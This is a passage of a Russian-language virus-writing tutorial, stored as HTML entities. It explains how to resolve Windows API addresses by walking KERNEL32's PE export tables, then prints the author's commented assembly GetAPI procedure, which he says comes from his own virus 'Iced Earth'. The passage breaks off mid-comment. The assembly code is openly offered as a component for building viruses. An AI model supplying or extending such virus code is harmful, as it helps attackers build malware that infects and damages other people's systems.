&#1085;&#1086;&#1084;&#1077;&#1088;
&#1087;&#1086;&#1079;&#1080;&#1094;&#1080;&#1080;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;, &#1084;&#1099;
&#1091;&#1084;&#1085;&#1086;&#1078;&#1072;&#1077;&#1084; &#1077;&#1075;&#1086;
&#1085;&#1072; 2 (&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1072;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;
&#1089;&#1086;&#1089;&#1090;&#1086;&#1080;&#1090; &#1080;&#1079;
&#1089;&#1083;&#1086;&#1074;) &#1080;
&#1087;&#1088;&#1080;&#1073;&#1072;&#1074;&#1083;&#1103;&#1077;&#1084;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1085;&#1099;&#1081;
&#1088;&#1077;&#1079;&#1091;&#1083;&#1100;&#1090;&#1072;&#1090; &#1082;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1091;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;.
&#1053;&#1080;&#1078;&#1077;&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1072;&#1103;
&#1092;&#1086;&#1088;&#1084;&#1091;&#1083;&#1072;
&#1082;&#1088;&#1072;&#1090;&#1082;&#1086;
&#1088;&#1077;&#1079;&#1102;&#1084;&#1080;&#1088;&#1091;&#1077;&#1090;
&#1074;&#1099;&#1096;&#1077;&#1089;&#1082;&#1072;&#1079;&#1072;&#1085;&#1085;&#1086;&#1077;:
<p>&#1052;&#1077;&#1089;&#1090;&#1086;&#1085;&#1072;&#1093;&#1086;&#1078;&#1076;&#1077;&#1085;&#1080;&#1077;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API: (&#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;
* 2) + VA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;
<p>&#1055;&#1088;&#1086;&#1089;&#1090;&#1086;, &#1085;&#1077;
&#1087;&#1088;&#1072;&#1074;&#1076;&#1072; &#1083;&#1080;?
&#1051;&#1072;&#1076;&#1085;&#1086;,
&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1081;
&#1096;&#1072;&#1075; (&#1080;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1080;&#1081;)
&#1079;&#1072;&#1082;&#1083;&#1102;&#1095;&#1072;&#1077;&#1090;&#1089;&#1103;
&#1074; &#1090;&#1086;&#1084;, &#1095;&#1090;&#1086;&#1073;&#1099;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;
&#1080;&#1079; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;. &#1059; &#1085;&#1072;&#1089;
&#1091;&#1078;&#1077; &#1077;&#1089;&#1090;&#1100;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;. &#1057; &#1077;&#1075;&#1086;
&#1087;&#1086;&#1084;&#1086;&#1097;&#1100;&#1102; &#1085;&#1072;&#1096;&#1072;
&#1078;&#1080;&#1079;&#1085;&#1100;
&#1080;&#1079;&#1088;&#1103;&#1076;&#1085;&#1086;
&#1091;&#1087;&#1088;&#1086;&#1097;&#1072;&#1077;&#1090;&#1089;&#1103;.
&#1052;&#1099; &#1087;&#1088;&#1086;&#1089;&#1090;&#1086;
&#1076;&#1086;&#1083;&#1078;&#1085;&#1099;
&#1091;&#1084;&#1085;&#1086;&#1078;&#1080;&#1090;&#1100;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083; &#1085;&#1072; 4 (&#1090;&#1072;&#1082;
&#1082;&#1072;&#1082; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;
&#1092;&#1086;&#1088;&#1084;&#1080;&#1088;&#1091;&#1077;&#1090;&#1089;&#1103;
&#1080;&#1079; &#1076;&#1074;&#1086;&#1081;&#1085;&#1099;&#1093;
&#1089;&#1083;&#1086;&#1074;, &#1072; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088;
&#1076;&#1074;&#1086;&#1081;&#1085;&#1086;&#1075;&#1086;
&#1089;&#1083;&#1086;&#1074;&#1072; &#1088;&#1072;&#1074;&#1077;&#1085; 4)
&#1080; &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1103;&#1077;&#1084;
&#1077;&#1075;&#1086; &#1082;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102;
&#1085;&#1072;&#1095;&#1072;&#1083;&#1072;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1072;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1084;&#1099;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080;
&#1088;&#1072;&#1085;&#1077;. &#1061;&#1077;&#1093;&#1077;,
&#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1091; &#1085;&#1072;&#1089;
&#1077;&#1089;&#1090;&#1100; RVA &#1072;&#1076;&#1088;&#1077;&#1089; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;.
&#1058;&#1077;&#1087;&#1077;&#1088;&#1100; &#1084;&#1099;
&#1076;&#1086;&#1083;&#1078;&#1085;&#1099;
&#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1077;&#1075;&#1086;, &#1076;&#1086;&#1073;&#1072;&#1074;&#1080;&#1090;&#1100;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077;
&#1103;&#1076;&#1088;&#1072; &#1080; &#1074;&#1089;&#1077;! &#1052;&#1099;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080; &#1077;&#1075;&#1086;!!!
&#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077;
&#1087;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084; &#1085;&#1072;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1091;&#1102;
&#1084;&#1072;&#1090;&#1077;&#1084;&#1072;&#1090;&#1080;&#1095;&#1077;&#1089;&#1082;&#1091;&#1102;
&#1092;&#1086;&#1088;&#1084;&#1091;&#1083;&#1091;:
<p>&#1040;&#1076;&#1088;&#1077;&#1089; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;:
(&#1054;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;*4)+VA
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;+&#1073;&#1072;&#1079;&#1072;
KERNEL32
<p><img src="vgw04_p02.gif" width="615" height="139">
<p>[...] &#1042; &#1101;&#1090;&#1080;&#1093;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1072;&#1093;
&#1073;&#1086;&#1083;&#1100;&#1096;&#1077;
&#1101;&#1083;&#1077;&#1084;&#1077;&#1085;&#1090;&#1086;&#1074;, &#1085;&#1086;
&#1074; &#1082;&#1072;&#1095;&#1077;&#1089;&#1090;&#1074;&#1077;
&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;&#1072;
&#1101;&#1090;&#1086;&#1075;&#1086; &#1074;&#1087;&#1086;&#1083;&#1085;&#1077;
&#1076;&#1086;&#1089;&#1090;&#1072;&#1090;&#1086;&#1095;&#1085;&#1086;...
<p>&#1071; &#1085;&#1072;&#1076;&#1077;&#1102;&#1089;&#1100;,
&#1095;&#1090;&#1086; &#1074;&#1099; &#1087;&#1086;&#1085;&#1103;&#1083;&#1080;
&#1084;&#1086;&#1080;
&#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1077;&#1085;&#1080;&#1103;. &#1071;
&#1087;&#1099;&#1090;&#1072;&#1102;&#1089;&#1100;
&#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1080;&#1090;&#1100;
&#1090;&#1072;&#1082; &#1087;&#1088;&#1086;&#1089;&#1090;&#1086;,
&#1082;&#1072;&#1082; &#1101;&#1090;&#1086;
&#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;,
&#1077;&#1089;&#1083;&#1080; &#1074;&#1099; &#1085;&#1077;
&#1087;&#1086;&#1085;&#1103;&#1083;&#1080; &#1080;&#1093;, &#1090;&#1086;
&#1085;&#1077; &#1095;&#1080;&#1090;&#1072;&#1081;&#1090;&#1077;
&#1076;&#1072;&#1083;&#1100;&#1096;&#1077;, &#1072;
&#1087;&#1077;&#1088;&#1077;&#1095;&#1080;&#1090;&#1072;&#1081;&#1090;&#1077;
&#1089;&#1085;&#1086;&#1074;&#1072;. &#1041;&#1091;&#1076;&#1100;&#1090;&#1077;
&#1090;&#1077;&#1088;&#1087;&#1077;&#1083;&#1080;&#1074;&#1099;. &#1071;
&#1091;&#1074;&#1077;&#1088;&#1077;&#1085;, &#1095;&#1090;&#1086; &#1074;&#1099;
&#1074;&#1089;&#1077; &#1087;&#1086;&#1081;&#1084;&#1077;&#1090;&#1077;.
&#1061;&#1084;&#1084;, &#1084;&#1086;&#1078;&#1077;&#1090; &#1074;&#1072;&#1084;
&#1085;&#1091;&#1078;&#1085;&#1086; &#1089;&#1081;&#1095;&#1072;&#1089;
&#1085;&#1077;&#1084;&#1085;&#1086;&#1075;&#1086; &#1082;&#1086;&#1076;&#1072;,
&#1095;&#1090;&#1086;&#1073;&#1099;
&#1091;&#1074;&#1080;&#1076;&#1077;&#1090;&#1100; &#1101;&#1090;&#1086; &#1074;
&#1076;&#1077;&#1081;&#1089;&#1090;&#1074;&#1080;&#1080;. &#1042;&#1086;&#1090;
&#1084;&#1086;&#1080;
&#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1103;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1083;,
&#1085;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;, &#1074;
&#1084;&#1086;&#1077;&#1084; &#1074;&#1080;&#1088;&#1091;&#1089;&#1077; Iced
Earth.
<p><code><!--mstheme--></font>
<pre><font size="2"><b>;---[ CUT HERE ]-------------------------------------------------------------
;
; &#1055;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099; GetAPI &#1080; GetAPIs
; ---------------------------
;
; &#1069;&#1090;&#1086; &#1084;&#1086;&#1080; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099;, &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1099;&#1077; &#1076;&#1083;&#1103; &#1085;&#1072;&#1093;&#1086;&#1078;&#1076;&#1077;&#1085;&#1080;&#1103; &#1074;&#1089;&#1077;&#1093; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1084;&#1099;&#1093; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; API...
; &#1054;&#1085;&#1080; &#1087;&#1086;&#1076;&#1077;&#1083;&#1077;&#1085;&#1099; &#1085;&#1072; 2 &#1095;&#1072;&#1089;&#1090;&#1080;. &#1055;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1072; GetAPI &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1090; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1090;&#1091; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1102;,
; &#1082;&#1086;&#1090;&#1086;&#1088;&#1091;&#1102; &#1084;&#1099; &#1077;&#1081; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1084;, &#1072; GetAPIs &#1080;&#1097;&#1077;&#1090; &#1074;&#1089;&#1077; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1099;&#1077; &#1074;&#1080;&#1088;&#1091;&#1089;&#1091; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;.

 GetAPI         proc

 ;-------------------------------------;
 ; &#1051;&#1072;&#1076;&#1085;&#1086;, &#1087;&#1086;&#1077;&#1093;&#1072;&#1083;&#1080;. &#1055;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1090;&#1088;&#1077;&#1073;&#1091;&#1102;&#1090;&#1089;&#1103; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1080; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1099;&#1077;      ;
 ; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1077;:                                                      ;
 ;                                                                          ;
 ; &#1053;&#1040; &#1042;&#1061;&#1054;&#1044;&#1045;  . ESI : &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1080;&#1084;&#1103; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; (&#1095;&#1091;&#1074;&#1089;&#1090;&#1074;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1072; &#1082; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1091;)    ;
 ; &#1053;&#1040; &#1042;&#1067;&#1061;&#1054;&#1044;&#1045; . EAX : &#1040;&#1076;&#1088;&#1077;&#1089; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API
 ;-------------------------------------;

        mov     edx,esi                         ; &#1057;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1080;&#1084;&#1103;
 @_1:   cmp     byte ptr [esi],0                ; &#1050;&#1086;&#1085;&#1077;&#1094; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080;?
        jz      @_2                             ; &#1044;&#1072;, &#1074;&#1089;&#1077; &#1074; &#1087;&#1086;&#1088;&#1103;&#1076;&#1082;&#1077;.
        inc     esi                             ; &#1053;&#1077;&#1090;, &#1087;&#1088;&#1086;&#1076;&#1086;&#1083;&#1078;&#1072;&#1077;&#1084; &#1087;&#1086;&#1080;&#1089;&#1082;
        jmp     @_1
 @_2:   inc     esi                             ; &#1093;&#1077;&#1093;, &#1085;&#1077; &#1079;&#1072;&#1073;&#1091;&#1076;&#1100;&#1090;&#1077; &#1086;&#1073; &#1101;&#1090;&#1086;&#1084;
        sub     esi,edx                         ; ESI = &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1080;&#1084;&#1077;&#1085;&#1080; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;
        mov     ecx,esi                         ; ECX = ESI :)

 ;-------------------------------------;
 ; &#1058;&#1072;&#1082;-&#1090;&#1072;&#1082;-&#1090;&#1072;&#1082;, &#1084;&#1086;&#1080; &#1076;&#1086;&#1088;&#1086;&#1075;&#1080;&#1077; &#1091;&#1095;&#1077;&#1085;&#1080;&#1082;&#1080;. &#1069;&#1090;&#1086; &#1086;&#1095;&#1077;&#1085;&#1100; &#1087;&#1088;&#1086;&#1089;&#1090;&#1086; &#1076;&#1083;&#1103; &#1087;&#1086;&#1085;&#1080;&#1084;&#1072;&#1085;&#1080;&#1103;. &#1059; &#1085;&#1072;&#1089;  ;
 ; &#1077;&#1089;&#1090;&#1100; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1085;&#1072;&#1095;&#1072;&#1083;&#1086; &#1080;&#1084;&#1077;&#1085;&#1080; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API. &#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077; &#1087;&#1088;&#1077;&#1076;&#1089;&#1090;&#1072;&#1074;&#1080;&#1084;, &#1095;&#1090;&#1086; &#1084;&#1099;   ;
 ; &#1080;&#1097;&#1077;&#1084; FindFirstFileA:                                                     ;
 ;                                                                          ;
 ; FFFA         db   &quot;FindFirstFileA&quot;,0                                     ;
 ;                    L- &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1079;&#1076;&#1077;&#1089;&#1100;                                    ;
 ;                                                                          ;
 ; &#1048; &#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1086; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1080;&#1090;&#1100; &#1101;&#1090;&#1086;&#1090; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100;, &#1095;&#1090;&#1086;&#1073;&#1099; &#1091;&#1079;&#1085;&#1072;&#1090;&#1100; &#1080;&#1084;&#1103; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API,      ;
 ; &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084; &#1080;&#1079;&#1085;&#1072;&#1095;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1080;&#1084;&#1103; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API &#1074; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1077;,;
 ; &#1085;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088; EDX, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1084;&#1099; &#1085;&#1077; &#1073;&#1091;&#1076;&#1077;&#1084; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;, &#1072; &#1079;&#1072;&#1090;&#1077;&#1084; &#1087;&#1086;&#1074;&#1099;&#1096;&#1072;&#1077;&#1084; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077;;
 ; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1103; &#1074; ESI, &#1087;&#1086;&#1082;&#1072; [ESI] &#1085;&#1077; &#1089;&#1090;&#1072;&#1085;&#1077;&#1090; &#1088;&#1072;&#1074;&#1085;&#1099;&#1084; 0.                          ;
 ;                                                                          ;
 ; FFFA         db   &quot;FindFirstFileA&quot;,0                                     ;
 ;                                    L- &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1079;&#1076;&#1077;c&#1100;             ;
 ;                                                                          ;
 ; &#1058;&#1077;&#1087;&#1077;&#1088;&#1100;, &#1074;&#1099;&#1095;&#1080;&#1090;&#1072;&#1103; &#1089;&#1090;&#1072;&#1088;&#1099;&#1081; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1086;&#1090; &#1085;&#1086;&#1074;&#1086;&#1075;&#1086; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1103;, &#1084;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; ;
 ; &#1080;&#1084;&#1077;&#1085;&#1080; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1090;&#1089;&#1103; &#1087;&#1086;&#1080;&#1089;&#1082;&#1086;&#1074;&#1086;&#1084;&#1091; &#1076;&#1074;&#1080;&#1078;&#1082;&#1091;. &#1047;&#1072;&#1090;&#1077;&#1084; &#1103; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1102; ;
 ; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1074; ECX, &#1076;&#1088;&#1091;&#1075;&#1086;&#1084; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1077;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1085;&#1077; &#1073;&#1091;&#1076;&#1077;&#1090; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;&#1089;&#1103; &#1076;&#1083;&#1103;     ;
 ; &#1095;&#1077;&#1075;&#1086;-&#1083;&#1080;&#1073;&#1086; &#1077;&#1097;&#1077;.                                                           ;
 ;-------------------------------------;

        xor     eax,eax                         ; EAX = 0
        mov     word ptr [ebp+Counter],ax       ; &#1059;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082; &#1074; 0

        mov     esi,[ebp+kernel]                ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077;
                                                ; PE-&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072; KERNEL32
        add     esi,3Ch
        lodsw                                   ; &#1074; AX
        add     eax,[ebp+kernel]                ; &#1053;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1091;&#1077;&#1084; &#1077;&#1075;&#1086;

        mov     esi,[eax+78h]                   ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
                                                ; &#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074;
        add     esi,[ebp+kernel]                ; &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
                                                ; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;
        add     esi,1Ch

 ;-------------------------------------;
 ; &#1051;&#1072;&#1076;&#1085;&#1086;, &#1089;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1086;&#1095;&#1080;&#1097;&#1072;&#1077;&#1084; EAX, &#1072; &#1079;&#1072;&#1090;&#1077;&#1084; &#1091;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082; &#1074; 0, &#1095;&#1090;&#1086;&#1073;&#1099;  ;
 ; &#1080;&#1079;&#1073;&#1077;&#1078;&#1072;&#1090;&#1100; &#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1099;&#1093; &#1086;&#1096;&#1080;&#1073;&#1086;&#1082;. &#1045;&#1089;&#1083;&#1080; &#1074;&#1099; &#1087;&#1086;&#1084;&#1085;&#1080;&#1090;&#1077;, &#1076;&#1083;&#1103; &#1095;&#1077;&#1075;&#1086; &#1089;&#1083;&#1091;&#1078;&#1080;&#1090; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077; 3Ch ;
 ; &#1074; PE-&#1092;&#1072;&#1081;&#1083;&#1077; (&#1086;&#1090;&#1089;&#1095;&#1080;&#1090;&#1099;&#1074;&#1072;&#1103; &#1089; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072; &#1073;&#1072;&#1079;&#1099;, &#1084;&#1077;&#1090;&#1082;&#1080; MZ), &#1074;&#1099; &#1087;&#1086;&#1081;&#1084;&#1077;&#1090;&#1077; &#1074;&#1089;&#1077; &#1101;&#1090;&#1086;. &#1052;&#1099;  ;
 ; &#1079;&#1072;&#1087;&#1088;&#1072;&#1096;&#1080;&#1074;&#1072;&#1077;&#1084; &#1085;&#1072;&#1095;&#1072;&#1083;&#1086; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077; &#1085;&#1072;&#1095;&#1072;&#1083;&#1072; PE-&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072; KERNEL32. &#1058;&#1072;&#1082; &#1082;&#1072;&#1082; &#1101;&#1090;&#1086;    ;
 ; RVA, &#1084;&#1099; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1091;&#1077;&#1084; &#1077;&#1075;&#1086; &#1080; &#1074;&#1091;&#1072;&#1083;&#1103;, &#1091; &#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077; PE-&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072;. &#1058;&#1077;&#1087;&#1077;&#1088;&#1100;;
 ; &#1084;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1072;&#1076;&#1088;&#1077;&#1089; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099; &#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074; (&#1074; &#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1077; PE+78h), &#1087;&#1086;&#1089;&#1083;&#1077; &#1095;&#1077;&#1075;&#1086; &#1084;&#1099;  ;
 ; &#1080;&#1079;&#1073;&#1077;&#1075;&#1072;&#1077;&#1084; &#1085;&#1077;&#1078;&#1077;&#1083;&#1072;&#1085;&#1085;&#1099;&#1093; &#1076;&#1072;&#1085;&#1085;&#1099;&#1093; &#1089;&#1090;&#1088;&#1091;&#1082;&#1090;&#1091;&#1088;&#1099; &#1080; &#1085;&#1072;&#1087;&#1088;&#1103;&#1084;&#1091; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;      ;
 ; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;.                                                                 ;
 ;-------------------------------------;

        lodsd                                   ; EAX = RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;
        add     eax,[ebp+kernel]                ; &#1053;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1091;&#1077;&#1084;
        mov     dword ptr [ebp+AddressTableVA],eax ; &#1057;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084; &#1077;&#1075;&#1086; &#1074; &#1092;&#1086;&#1088;&#1084;&#1077; VA

        lodsd                                   ; EAX = Name Ptrz Table RVA
        add     eax,[ebp+kernel]                ; Normalize
        push    eax                             ; mov [ebp+NameTableVA],eax

        lodsd                                   ; EAX = Ordinal Table RVA
        add     eax,[ebp+kernel]                ; Normalize
        mov     dword ptr [ebp+OrdinalTableVA],eax ; Store in VA form

        pop     esi                             ; ESI = Name Ptrz Table VA

 ;-------------------------------------;
 ; &#1045;&#1089;&#1083;&#1080; &#1074;&#1099; &#1087;&#1086;&#1084;&#1085;&#1080;&#1090;&#1077;, &#1091; &#1085;&#1072;&#1089; &#1074; ESI &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1091; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;, &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091;   ;
 ; &#1095;&#1090;&#1086;&#1073;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100; &#1101;&#1090;&#1086;&#1090; &#1072;&#1076;&#1088;&#1077;&#1089; &#1084;&#1099; &#1076;&#1077;&#1083;&#1072;&#1077;&#1084; LODSD, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1090; DWORD, &#1085;&#1072;    ;
 ; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; ESI, &#1074; &#1087;&#1088;&#1080;&#1077;&#1084;&#1085;&#1080;&#1082; (&#1074; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084; &#1089;&#1083;&#1091;&#1095;&#1072;&#1077; EAX). &#1058;&#1072;&#1082; &#1082;&#1072;&#1082; &#1101;&#1090;&#1086; &#1073;&#1099;&#1083; ;
